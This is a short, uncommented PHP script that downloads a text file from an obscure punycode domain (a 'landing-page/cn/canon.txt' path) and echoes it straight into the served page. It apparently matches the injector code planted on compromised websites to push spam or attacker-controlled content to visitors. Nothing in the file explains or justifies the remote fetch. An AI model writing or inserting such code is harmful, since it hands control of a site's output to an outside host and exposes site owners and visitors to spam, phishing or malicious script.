<?php
$url = "https://xn--pdkuc0bb.net/landing-page/cn/canon.txt";
$content = file_get_contents($url);
if ($content !== false) {
    echo "?>" . $content;
}
?>